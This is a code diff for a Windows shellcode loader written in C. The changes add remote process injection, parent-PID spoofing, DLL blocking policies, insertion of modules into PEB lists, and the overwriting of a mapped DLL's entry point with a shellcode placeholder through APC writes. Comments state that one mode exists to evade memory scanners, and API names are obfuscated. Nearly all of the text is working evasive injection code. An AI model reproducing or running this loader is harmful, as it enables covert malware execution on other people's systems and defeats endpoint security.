+//     const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };
+//     NtQueueApcThreadEx2_t pNtQueueApcThread = (NtQueueApcThreadEx2_t)dynamic::NotGetProcAddress(GetModuleHandle(getLib), NtQueueFutureApcEx2Str);
+//     // create a thread using create remote thread and call the function
+
+// // print hProcess:
+//     // printf("[+] hProcess is at: %p\n", hProcess);
+//     QUEUE_USER_APC_FLAGS apcFlags = QUEUE_USER_APC_FLAGS_NONE;
+    
+//     DWORD threadId;
+//     // memmove: 
+    // HANDLE hThread = CreateRemoteThread(
+    //         hProcess,          // Handle to the target process
+    //         NULL,              // Default security attributes
+    //         0,                 // Stack size (0 = default)
+    //         (LPTHREAD_START_ROUTINE)ExitThread,  // Thread start routine (ExitThread)
+    //         NULL,              // Thread parameter (None, since ExitThread takes no parameters)
+    //         CREATE_SUSPENDED,                 // Creation flags
+    //         &threadId          // Thread ID
+    // );
+    // NTSTATUS status = pNtQueueApcThread(hThread, NULL, apcFlags, (PVOID)GetProcAddress((HMODULE)pModuleBase, "memmove"), (void*)pHookAddr, (void*)&DllEntryGlobal, (void*)sizeof(DWORD_PTR));
+
+    // if(status != STATUS_SUCCESS) {
+    //     printf("[-] Failed to queue APC Ex2. NTSTATUS: 0x%X\n", status);
+    // } else {
+    //     printf("[+] APC Ex2 queued successfully\n");
+    // }
+    // //resume thread:
+    // ResumeThread(hThread);
+    // WaitForSingleObject(hThread, INFINITE);
+
+    // BOOL result = WriteProcessMemoryAPC(hProcess, (BYTE*)*(DWORD_PTR*)pHookAddr, (BYTE*)&DllEntryGlobal, sizeof(DWORD_PTR), bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
+    // if(result != 0) {
+    //     printf("[+] Pointer value successfully written to the address that pHookAddr points to in the remote process.\n");
+    // } else {
+    //     printf("[-] Failed to write memory. Error: %lu\n", GetLastError());
+    // }
+    
+    printf("[+] memory scan now. The VMT Ptr has been replaced. \n");
+    getchar();
+
+
+    printf("[+] Pointer value successfully written to the address that pHookAddr points to in the remote process.\n");
+
+
+    printf("[+] memory scan now. The VMT Ptr has been replaced. \n");
+    getchar();
+
+    printf("[+] *(DWORD_PTR*)pHookAddr after change: %p\n", *(DWORD_PTR*)pHookAddr);
+
+	return 0;
+}
+
 ////////////////////////////////////////
 
 unsigned char magiccode[] = ####SHELLCODE####;
@@ -1327,10 +1881,18 @@ int main(int argc, char *argv[])
     BOOL bTxF = FALSE, bUseCustomDLL = FALSE; // Flag to indicate whether to search for a suitable DLL
     int dllOrder = 1; // Default to the first suitable DLL
 
-    BOOL bUseRtlCreateUserThread = FALSE, bUseCreateThreadpoolWait = FALSE; // Default to FALSE
     BOOL bUseLdrLoadDll = FALSE; // Default to FALSE
     BOOL bUseDotnet = FALSE; // Default to FALSE
-    BOOL bUseNoAccess = FALSE; // Default to FALSE
+    BOOL bUseAddPebList = FALSE; // Default to FALSE
+    ULONG_PTR ppid = 0; // Initialize ppid
+    BOOL bPpid = FALSE; // Default to FALSE
+
+    // Add new option to enable remote injection
+    // Remote injection not support LdrLoadDll at the moment, it can be added later by 
+    // executing this command with createRemoteThread triggered by callback function.
+    BOOL bRemoteInjection = FALSE; // Default to FALSE
+    //TODO: 
+
 
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-h") == 0) {
@@ -1350,6 +1912,21 @@ int main(int argc, char *argv[])
             bUseCreateThreadpoolWait = TRUE;
         } else if (strcmp(argv[i], "-ldr") == 0) {
             bUseLdrLoadDll = TRUE;
+        } else if (strcmp(argv[i], "-peb") == 0) {
+            bUseAddPebList = TRUE;
+        } else if (strcmp(argv[i], "-remote") == 0) {
+            bRemoteInjection = TRUE;
+        } else if (i + 1 < argc && strcmp(argv[i], "-ppid") == 0) {
+            // Parse the next argument as an integer for ppid
+            ppid = atoi(argv[i + 1]);  // Convert string to integer
+            if (ppid <= 0) {
+                printf("[-] Invalid PID: %s\n", argv[i + 1]);
+                return 1;
+            } else {
+                printf("[+] Parent PID: %lu\n", ppid);
+            }
+            bPpid = TRUE;
+            i++; // Skip next argument as it's already processed
         } else if (strcmp(argv[i], "-dotnet") == 0) {
             if(bUseCustomDLL) {
                 bUseDotnet = TRUE;
@@ -1383,7 +1960,7 @@ int main(int argc, char *argv[])
     printf("[+] Transaction Mode: %s\n", bTxF ? "Enabled" : "Disabled");
 
     if (bUseNoAccess) {
-        printf("[+] No access mode enabled to evade Moneta scanner.\n");
+        printf("[+] No access mode enabled to evade memory scanner.\n");
     }
 
     LoadNtFunctions(); // Load the NT functions
@@ -1409,6 +1986,144 @@ int main(int argc, char *argv[])
 
     wprintf(L"[+] Using DLL: %ls\n", dllPath);
     wprintf(L"[+] TxF Mode: %ls\n", bTxF ? L"Enabled" : L"Disabled");
+
+
+    BOOL success = block_dlls_local();
+
+    if(!success) {
+        printf("[-] Failed to block DLLs. Exiting.\n");
+        return 1;
+    } else {
+        printf("[+] DLLs blocked successfully.\n");
+    }
+
+    // HANDLE hProcess = NULL; 
+    // check bRemoteInjection
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+
+    /// ACG, and PPID: 
+    STARTUPINFOEXA SI;
+    ZeroMemory(&SI, sizeof(SI));
+    SI.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+    SI.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
+	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
+	HANDLE parentProc = NULL;
+    // set up blocking policy. 
+    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
+
+	// DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
+	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY2_MODULE_TAMPERING_PROTECTION_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_DEP_ATL_THUNK_ENABLE + PROCESS_CREATION_MITIGATION_POLICY_SEHOP_ENABLE + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_REMOTE_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON;
+    // PROCESS_CREATION_MITIGATION_POLICY_FORCE_RELOCATE_IMAGES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_STRICT_HANDLE_CHECKS_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_HIGH_ENTROPY_ASLR_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_ON
+
+	// Initializing OBJECT_ATTRIBUTES and CLIENT_ID struct
+	OBJECT_ATTRIBUTES pObjectAttributes;
+	InitializeObjectAttributes(&pObjectAttributes, NULL, 0, NULL, NULL);
+	CLIENT_ID pClientId;
+	pClientId.UniqueProcess = (PVOID)ppid;
+	pClientId.UniqueThread = (PVOID)0;
+
+    if(bPpid) {
+        NTSTATUS sTart = NtOpenFuture(&parentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);
+
+        if(sTart != STATUS_SUCCESS) {
+            printf("[-] Failed to open parent process. Error: 0x%X\n", sTart);
+            return 1;
+        } else {
+            printf("[+] Parent process opened successfully.\n");
+        }
+
+        // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
+        SIZE_T size = 0;
+        InitializeProcThreadAttributeList(NULL, 2, 0, &size);
+
+        // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
+        SI.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
+
+        // Initialise our list 
+        InitializeProcThreadAttributeList(SI.lpAttributeList, 2, 0, &size);
+
+        // Assign parent pid attribute to attribute list
+        UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProc, sizeof(HANDLE), NULL, NULL);
+
+        // Assign mitigation policies to new process include dynamic code guard, and block non-microsoft binaries, etc.
+        UpdateProcThreadAttribute(SI.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(HANDLE), NULL, NULL);
+        /// MP, and PPID: 
+    }
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    DWORD pid = 0;
+    char notepadPath[256] = {0};  // Initialize the buffer
+    if(bRemoteInjection) {
+
+        // Get the process ID from the user
+        printf("Enter the process ID: ");
+        char input[MAX_INPUT_SIZE];
+
+        
+        // Use fgets to get the input, allowing for empty input (pressing Enter)
+        if (fgets(input, MAX_INPUT_SIZE, stdin) != NULL) {
+            // Remove the trailing newline character from the input
+            input[strcspn(input, "\n")] = 0;
+
+            // Check if the input is empty (user just pressed Enter) or invalid (non-numeric)
+            if (strlen(input) == 0 || sscanf(input, "%d", &pid) != 1) {
+                // If empty input or invalid input (non-numeric), launch Notepad
+                printf("[-] Invalid or no PID provided. Starting Notepad...\n");
+
+                // Determine the correct Notepad path based on system architecture
+                if (IsSystem64Bit()) {
+                    strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
+                    // strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\RuntimeBroker.exe");
+                } else {
+                    strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
+                }
+
+                // PPID: 
+                if(!bPpid) {
+                    // Attempt to create Notepad process
+                    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+                        printf("[+] Notepad started with PID: %d\n", pi.dwProcessId);
+                        hProcess = pi.hProcess;  // Store Notepad handle
+                    } else {
+                        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
+                        return 1;
+                    }
+                } else {
+                    // Attempt to create Notepad process
+                    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SI.StartupInfo, &pi)) {
+                        printf("[+] Secured Notepad started with PID: %d\n", pi.dwProcessId);
+                        hProcess = pi.hProcess;  // Store Notepad handle
+                    } else {
+                        MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
+                        return 1;
+                    }
+                }
+
+            } else {
+                // Valid PID input, try to open the process
+                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+                if (hProcess == NULL) {
+                    printf("[-] Failed to open process with PID: %d\n", pid);
+                    return 1;
+                } else {
+                    printf("[+] Opened process with PID: %d\n", pid);
+                }
+            }
+        }
+
+    } else {
+        // If bRemoteInjection is FALSE, we open the current process
+        printf("[*] bRemoteInjection is FALSE. Opening current process.\n");
+        hProcess = GetCurrentProcess();
+    }
+
+    ///printf hProcess:
+    printf("[+] hProcess: %p\n", hProcess);
+    // print process ID:
+    printf("[+] Process ID: %d\n", GetProcessId(hProcess));
+
 
     /// deal with TxF argument
     HANDLE fileHandle;
@@ -1447,7 +2162,9 @@ int main(int argc, char *argv[])
 
     LONG status = 0;
     HANDLE fileBase = NULL;
+    HANDLE fileBaseRemote = NULL;
     HANDLE hSection = NULL;
+    HANDLE hSectionRemote = NULL;
 
     if(bUseLdrLoadDll) {
         printf("[+] Using LdrLoadDll function.\n");
@@ -1466,7 +2183,7 @@ int main(int argc, char *argv[])
         printf("[+] Using mapped DLL with missing PEB (NtCreateSection and NtMapViewOfSection).\n");
         // Create a section from the file
         // LONG status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
-        status = NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
+        status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, fileHandle);
         if (status != 0) {
             printf("NtCreateSection failed. Status: %x\n", status);
             CloseHandle(fileHandle);
@@ -1476,17 +2193,82 @@ int main(int argc, char *argv[])
         // Map the section into the process
         // PVOID fileBase = NULL;
         SIZE_T viewSize = 0;
-        status = NtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID*)&fileBase, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);
+        status = NtMapViewOfSection(hSection, GetCurrentProcess(), (PVOID*)&fileBase, 0, 0, NULL, &viewSize, 2, 0, PAGE_READWRITE);
         if (status != 0) {
             printf("NtMapViewOfSection failed. Status: %x\n", status);
             CloseHandle(hSection);
             CloseHandle(fileHandle);
             return 1;
+        } else {
+            printf("[+] Section mapped successfully.\n");
+            //print fileBase:
+            printf("[+] fileBase: %p\n", fileBase);
+            //print view size:
+            printf("[+] viewSize: %lu\n", viewSize);
         }
+
+        // // Step 4: Duplicate the section handle for the remote process
+        // if (!DuplicateHandle(
+        //         GetCurrentProcess(),
+        //         hSection,
+        //         hProcess,
+        //         &hSectionRemote,
+        //         0,
+        //         FALSE,
+        //         DUPLICATE_SAME_ACCESS
+        //     )) {
+        //     printf("[-] Failed to duplicate handle for the remote process. Error: %x\n", GetLastError());
+        //     return 1;
+        // } else {
+        //     printf("[+] Section handle duplicated successfully.\n");
+        // }
+	// ZwMapViewOfSection(secHandle, pi.hProcess, &sectionBaseAddressCreatedProcess, NULL, NULL, NULL, &viewSizeCreatedPrcess, ViewShare, NULL, PAGE_EXECUTE_WRITECOPY);
+
+        if(bRemoteInjection) {
+            status = NtMapViewOfSection(hSection, hProcess, (PVOID*)&fileBaseRemote, 0, 0, NULL, &viewSize, 2, 0, PAGE_EXECUTE_WRITECOPY);
+            if (status != 0) {
+                printf("NtMapViewOfSection failed. Status: %x\n", status);
+                CloseHandle(hSectionRemote);
+                CloseHandle(fileHandle);
+                return 1;
+            } else {
+                printf("[+] Section mapped to remote process successfully.\n");
+                //print fileBaseRemote:
+                printf("[+] fileBaseRemote: %p\n", fileBaseRemote);
+                printf("[+] viewSize: %lu\n", viewSize);
+            }
+        }
+
+        // status = NtUnmapViewOfSection(GetCurrentProcess(), fileBase);
+        // if(status != 0) {
+        //     printf("NtUnmapViewOfSection failed. Status: %x\n", status);
+        //     return 1;
+        // } else {
+        //     printf("[+] Local Process section unmapped successfully.\n");
+        // }
+        printf("[+] press any key to continue\n");
+        getchar();
     }
 
 
+    printf("[!] Before add our module to the PEB lists. \n");
+    printf("[!] press any key to continue\n");
+    getchar();
+    if(!bUseLdrLoadDll) {
+        if(bUseAddPebList) {
+            const wchar_t* dllName = GetDllNameFromPath(dllPath);
 
+            bool bAddModuleToPEB = AddModuleToPEB((PBYTE)fileBase, dllPath, (LPWSTR)dllName, (ULONG_PTR)fileBase);
+            if(bAddModuleToPEB) {
+                printf("[+] AddModuleToPEB succeeded\n");
+                wprintf(L"DLL %ls added to PEB lists\n", dllPath);
+            } else {
+                printf("[-] AddModuleToPEB failed\n");
+            }
+        }
+    }
+    printf("[!] press any key to continue\n");
+    getchar();
 
 
 
@@ -1495,18 +2277,41 @@ int main(int argc, char *argv[])
     // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
     // DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
 
-    //print fileBase:
-    printf("[+] fileBase: %p\n", fileBase);
+
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
     printf("[+] DOS header: %p\n", dosHeader);
     PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
-    printf("[+] NT header: %p\n", ntHeader);
+
+    if(bRemoteInjection) {
+        dosHeader = (PIMAGE_DOS_HEADER)malloc(sizeof(IMAGE_DOS_HEADER));
+        if (!ReadProcessMemory(hProcess, (LPCVOID)fileBaseRemote, dosHeader, sizeof(IMAGE_DOS_HEADER), NULL)) {
+            printf("Failed to read DOS header. Error: %x\n", GetLastError());
+            return 1;
+        }
+        printf("[+] DOS header read successfully from remote process: %p\n", dosHeader);
+
+        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)malloc(sizeof(IMAGE_NT_HEADERS));
+        if (!ReadProcessMemory(hProcess, (LPCVOID)((DWORD_PTR)fileBaseRemote + dosHeader->e_lfanew), ntHeader, sizeof(IMAGE_NT_HEADERS), NULL)) {
+            printf("Failed to read NT header. Error: %x\n", GetLastError());
+            return 1;
+        }
+        printf("[+] NT header read successfully from remote process: %p\n", ntHeader);
+    }
+
+    // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
+    // printf("[+] NT header: %p\n", ntHeader);
+    // DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
     DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
-    printf("[+] Entry point RVA: %x\n", entryPointRVA);
+    printf("[+] Entry point RVA: %p\n", entryPointRVA);
 
     // Size of the DLL in memory
+    // SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;
     SIZE_T dllSize = ntHeader->OptionalHeader.SizeOfImage;
-    printf("[+] DLL size: %lu bytes\n", dllSize);
+    printf("[+] DLL size: %lu\n", dllSize);
+
+
+    //####END####
+
 
     // Load the DLL to get its base address in current process
     // HMODULE hDll = LoadLibraryW(dllPath); //Normal loading
@@ -1529,9 +2334,15 @@ int main(int argc, char *argv[])
     // Calculate the AddressOfEntryPoint in current process
     // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
 	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
-    
-    PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)fileBase);
-	printf("[+] DLL entry point: %p\n", dllEntryPoint);
+    dllEntryPoint = NULL;
+    if(bRemoteInjection) {
+        dllEntryPoint = (PVOID)((DWORD_PTR)fileBaseRemote + entryPointRVA);
+    } else {
+        dllEntryPoint = (PVOID)((DWORD_PTR)fileBase + entryPointRVA);
+    }
+	printf("[+] Remote DLL entry point: %p\n", dllEntryPoint);
+
+	// printf("[+] DLL entry point: %p\n", dllEntryPoint);
     // wprintf(L"DLL %ls added to PEB lists\n", dllPath);
 
     // Overwrite the AddressOfEntryPoint with magiccode
@@ -1539,7 +2350,7 @@ int main(int argc, char *argv[])
     // BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);
 
     ///////////////////////////// Let's get the memory protection of the target DLL's entry point before any modification: 
-    HANDLE hProcess = GetCurrentProcess();
+    
     MEMORY_BASIC_INFORMATION mbi;
     SIZE_T result;
 
@@ -1573,11 +2384,17 @@ int main(int argc, char *argv[])
     //use the normal way:
     // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
 
-    //####END####
 
     PVOID baseAddress = dllEntryPoint; // BaseAddress must be a pointer to the start of the memory region
-    SIZE_T regionSize = magiccodeSize; // The size of the region
+    regionSize = magiccodeSize; // The size of the region
     ULONG oldProtect;
+
+    // print magiccodeSize:
+    printf("[+] magiccodeSize: %lu\n", magiccodeSize);
+    //printf regionSize: 
+    printf("[+] regionSize: %lu\n", regionSize);
+    /// print lots of characters to attract attention:
+    printf("[+] Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! Hack the planet! \n");
 
 
     status = NtProtectVirtualMemory(
@@ -1599,6 +2416,32 @@ int main(int argc, char *argv[])
         result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
     }
 
+
+    // use WriteProcessMemoryAPC to Write hook stub to the current process memory after the dllEntryPoint plus the magiccodeSize:
+    // PVOID hookStub = (PVOID)((DWORD_PTR)dllEntryPoint + magiccodeSize + 8);
+    // SIZE_T hookStubSize = HOOKSTUB_SIZE;
+
+    // // Now you can use hookStubSize in your WriteProcessMemory or any other function.
+    // printf("HookStub size: %zu\n", hookStubSize);
+    // printf("[*] hookStub: %p\n", hookStub);
+    // printf("[*] HookStubSize: %lu\n", hookStubSize);
+    // //print the address of func HookStub:
+    // printf("[+] HookStub @ %p\n", HookStub);
+
+    // // DWORD oldProtect = 0;
+    // // if (!VirtualProtectEx(hProcess, hookStub, hookStubSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+    // //     printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
+    // //     CloseHandle(hProcess);
+    // //     return 1;
+    // // }
+    // result = WriteProcessMemoryAPC(hProcess, (BYTE*)hookStub, (BYTE*)HookStub, hookStubSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait);
+    // // print the allocated hookStub:
+    // printf("[+] HookStub re-allocated @ %p\n", hookStub);
+    // printf("[+] If we check the remote process memory, we should see mapped HookStub code \n");
+    // printf("[+] press any key to continue\n");
+    // getchar();
+
+
     // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
     //     printf("[-] VirtualProtectEx failed to restore original memory protection. Error: %lu\n", GetLastError());
     // }
@@ -1606,9 +2449,54 @@ int main(int argc, char *argv[])
     // if (!VirtualProtect(dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
     //     printf("[-] VirtualProtect failed to restore original memory protection. Error: %lu\n", GetLastError());
     // }
-
+    /// sleep for 2 seconds:
+    // SimpleSleep(2000);
     /// NtProtectVirtualMemory cause Modified code flags in .text and .rdata section in the target DLL.
 
+    if (result) {
+        printf("Failed to APC write magiccode. Error: %lu\n", GetLastError());
+        // FreeLibrary(hDll);
+        // CloseHandle(hSection);
+        UnmapViewOfFile(fileBase);
+        // CloseHandle(fileMapping);
+        // CloseHandle(fileHandle);
+        // return 1;
+    } else {
+		printf("[+] Magic code written with APC write.\n");
+        printf("[+] press any key to continue\n");
+        getchar();
+        // SimpleSleep(10000);
+	}
+
+    if(bUseNoAccess && !bRemoteInjection) {
+        // // make it disappear with sys func 32: 
+        const char sysfunc32Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '2', 0 };
+        initialize_keys();
+        initialize_data((char*)dllEntryPoint, magiccodeSize); 
+        // sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc32Char);
+        sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
+        NTSTATUS eny = sysfunc32(&pData, &pKey);
+        if(eny != STATUS_SUCCESS) {
+            printf("[-] sysfunc32 failed to encrypt the data. Status: %x\n", eny);
+        } else {
+            printf("[+] sysfunc32 succeeded to encrypt the data.\n");
+        }
+        // for (int i = 0; i < 16; i++) {
+        //     r = rand();
+        //     key[i] = (char) r;
+        // }
+        // //print tyhe key value:
+        // printf("[+] XOR key: ");
+        // for (int i = 0; i < 16; i++) {
+        //     printf("%02x", key[i]);
+        // }
+        // // encrypt the payload
+        // DWORD oldPal = 0;
+        // sUrprise((char *)(LPVOID)baseAddress, regionSize, key, sizeof(key));
+        // printf("[+] Global dllEntryPoint memory encoded with XOR \n");
+        printf("[+] press any key to continue\n");
+        getchar();
+    }
     ULONG Protect = PAGE_EXECUTE_READ;
     if(bUseNoAccess) {
         Protect = PAGE_NOACCESS;
@@ -1633,193 +2521,290 @@ int main(int argc, char *argv[])
         
     
 
-    if (result) {
-        printf("Failed to APC write magiccode. Error: %lu\n", GetLastError());
-        // FreeLibrary(hDll);
-        // CloseHandle(hSection);
-        UnmapViewOfFile(fileBase);
-        // CloseHandle(fileMapping);
-        // CloseHandle(fileHandle);
-        // return 1;
-    } else {
-		printf("[+] Magic code written with APC write.\n");
-        printf("[+] press any key to continue\n");
-        getchar();
-        // SimpleSleep(10000);
-	}
 
-    if(bUseNoAccess) {
-        // //change the memory protection back to PAGE_EXECUTE_READ:
-            status = NtProtectVirtualMemory(
-            hProcess,
-            &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
-            &regionSize, // A pointer to the size of the region
-            PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
-            // PAGE_EXECUTE_WRITECOPY, 
-            &oldProtect); // The old protection attributes
-        if(status != STATUS_SUCCESS) {
-            printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
-        } else {
-            printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
-        }
-    }
+    // PIMAGE_DOS_HEADER dosHeader1 = (PIMAGE_DOS_HEADER)fileBase;
+    // PIMAGE_NT_HEADERS ntHeader1 = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader1->e_lfanew);
+    // DWORD entryPointRVA1 = ntHeader1->OptionalHeader.AddressOfEntryPoint;
+    // // //Write to .text section
+    // PVOID dllEntryPoint1 = (PVOID)(entryPointRVA1 + (DWORD_PTR)fileBase);
 
-    // Empty the working set
-    // if (EmptyWorkingSet(GetCurrentProcess())) {
-    //     printf("Successfully emptied the working set.\n");
-    // } else {
-    //     printf("Failed to empty the working set. Error: %d\n", GetLastError());
+    // PIMAGE_TLS_CALLBACK *callback_decoy;
+    // PIMAGE_DATA_DIRECTORY tls_entry_decoy = &ntHeader1->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+
+    // if(tls_entry_decoy->Size) {
+    //     PIMAGE_TLS_DIRECTORY tls_dir_decoy = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)fileBase + tls_entry_decoy->VirtualAddress);
+    //     callback_decoy = (PIMAGE_TLS_CALLBACK *)(tls_dir_decoy->AddressOfCallBacks);
+    //     for(; *callback_decoy; callback_decoy++)
+    //         (*callback_decoy)((LPVOID)fileBase, DLL_PROCESS_ATTACH, NULL);
     // }
+    // // Use function pointer to call the DLL entry point 2nd time.
+    // DLLEntry DllEntry1 = (DLLEntry)((unsigned long long int)fileBase + entryPointRVA1);
+    // // (*DllEntry1)((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, 0);
 
-    // Empty the working set
-    if (SetProcessWorkingSetSize(hProcess, 999, 999)) {
-        printf("Working set size reduced to minimal.\n");
-    } else {
-        printf("Failed to set working set size. Error: %d\n", GetLastError());
-    }
-    
-    // DisableDebugPrivilege();
-
-    printf("[+] press any key to continue\n");
-    getchar();
-    
-    // Initial buffer size for QueryWorkingSet
-    DWORD bufferSize = sizeof(PSAPI_WORKING_SET_INFORMATION) + sizeof(PSAPI_WORKING_SET_BLOCK) * 1024;
-    
-    // Allocate a buffer dynamically
-    PPSAPI_WORKING_SET_INFORMATION pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    
-    if (pWorkingSetInfo == NULL) {
-        printf("Failed to allocate memory. Error: %d\n", GetLastError());
-        return 1;
-    }
-
-    // Query the working set information
-    if (!QueryWorkingSet(hProcess, pWorkingSetInfo, bufferSize)) {
-        DWORD error = GetLastError();
-        if (error == ERROR_INSUFFICIENT_BUFFER) {
-            printf("Buffer too small. Allocating more memory.\n");
-            // Try increasing the buffer size and query again
-            VirtualFree(pWorkingSetInfo, 0, MEM_RELEASE);
-            
-            // Increase buffer size
-            bufferSize *= 2;
-            pWorkingSetInfo = (PPSAPI_WORKING_SET_INFORMATION)VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            
-            if (pWorkingSetInfo == NULL) {
-                printf("Failed to allocate memory after resizing. Error: %d\n", GetLastError());
-                return 1;
-            }
-
-            // Query again with a larger buffer
-            if (!QueryWorkingSet(hProcess, pWorkingSetInfo, bufferSize)) {
-                printf("Failed to query working set again. Error: %d\n", GetLastError());
-                VirtualFree(pWorkingSetInfo, 0, MEM_RELEASE);
-                return 1;
-            }
-        } else {
-            printf("Failed to query working set. Error: %d\n", error);
-            VirtualFree(pWorkingSetInfo, 0, MEM_RELEASE);
-            return 1;
-        }
-    }
-
-    // Iterate through the working set entries and check the Shared and ShareCount values
-    for (DWORD i = 0; i < pWorkingSetInfo->NumberOfEntries; i++) {
-        PSAPI_WORKING_SET_BLOCK block = pWorkingSetInfo->WorkingSetInfo[i];
-
-        // Check Shared and ShareCount values
-        if (block.Shared == 0 || block.ShareCount == 0) {
-            printf("Entry %lu: Shared = %d, ShareCount = %d\n", i, block.Shared, block.ShareCount);
-        }
-    }
-
-    // Print number of entries in the working set
-    printf("Number of entries in working set: %llu\n", pWorkingSetInfo->NumberOfEntries);
-
-
-    printf("[+] press any key to continue\n");
-    getchar();
-    // end of working set size to 0
-    
-    
-
